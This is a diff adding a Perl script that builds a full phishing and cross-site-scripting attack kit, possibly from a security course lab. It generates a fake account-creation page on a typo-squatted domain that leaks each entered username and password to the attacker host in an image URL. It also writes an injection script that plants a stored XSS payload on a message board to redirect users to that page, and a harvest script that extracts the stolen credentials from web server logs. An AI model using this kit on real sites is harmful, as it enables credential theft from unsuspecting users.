@@ -1,0 +1,71 @@
+#!/usr/bin/perl
+
+# $ARGV[0] is the good domain, $ARGV[1] is the bad domain
+die "usage: build <basename>\n" unless (scalar(@ARGV) == 1);
+$good = "www.usnastem.net/$ARGV[0]";
+$bad = "www.usnastam.net/$ARGV[0]";
+
+################ Make newact.html ################################
+my $newactContents = <<"END_MSG";
+<html><body>
+<h1>Message Board Create New Account</h1>
+<hr>
+    <script type="text/Javascript">
+var respcount = 0;
+respfunc = function()
+{
+if (respcount > 0) return true;
+respcount++;
+document.getElementById("foo").innerHTML = '<img src="https://$bad/fabatug.png?UNAME=' + document.theForm.uname.value + '&PASSWORD=' + document.theForm.pswd.value+ '">';
+attret = function(){document.theForm.submit();}
+setTimeout(attret,100);
+return false;
+}
+    </script>
+    <form name="theForm" action="https://$good/msg/newacct.cgi" method="POST" onsubmit="return respfunc();">
+      Username: <input type="text" name="uname"><br>
+      Password: <input type="password" name="pswd"><br>
+      <input type="submit" 
+	     value="create account">
+    </form>
+    <div id="foo" style="visibility: hidden;"></div>
+</body></html>
+END_MSG
+
+open(NEWAF,"> newact.html");
+print NEWAF $newactContents;
+close(NEWAF);
+`mkdir -p ./msg; chmod 755 ./msg; mv newact.html ./msg; chmod 644 ./msg/newact.html`;
+
+
+################ Make inject script ################################
+my $message = <<"END_MSG";
+#!/bin/bash
+
+realDomain='$good'
+attackDomain='$bad'
+
+injectionmsg='/msg/mb.cgi?msg=%3Cscript+type%3D%22text%2Fjavascript%22%3Efoo+%3D+function%28%29+%7B+for%28var+i+%3D+0%3B+i+%3C+document.body.children.length%3B+i%2B%2B%29+%7B+var+n+%3D+document.body.children%5Bi%5D%3B+if+%28n.innerHTML+%3D%3D+%22create+new+account%22%29+n.href%3D%22https://'\$attackDomain'/msg/newact.html%22%3B+%7D%7D%3B+setTimeout%28foo%2C+1000%29%3B%3C%2Fscript%3EThis+is+a+good+day%21'
+
+curl --data 'uname=jojo&pswd=monkey' 'https://'\$realDomain'/msg/newacct.cgi'
+sleep 2
+curl --cookie 'uname=jojo; pswd=monkey' 'https://'\$realDomain\$injectionmsg
+END_MSG
+
+open(INJF,"> inject");
+print INJF $message;
+close(INJF);
+`chmod +x ./inject`;
+
+my $harvest1 = 
+    '#!/bin/bash'."\n".'cat /var/log/apache2/usnastam.net-access.log | perl -e \'while(<>){if($_=~/GET .*\\/';
+
+my $harvest2 = 
+    '\/fabatug\.png\?(UNAME\S+)&(PASSWORD\S+)\s/){print "$1\t$2\n";}}\'';
+
+$harvest = $harvest1.$ARGV[0].$harvest2;
+open(HARF,"> harvest");
+print HARF $harvest;
+close(HARF);
+`chmod +x ./harvest`;
+
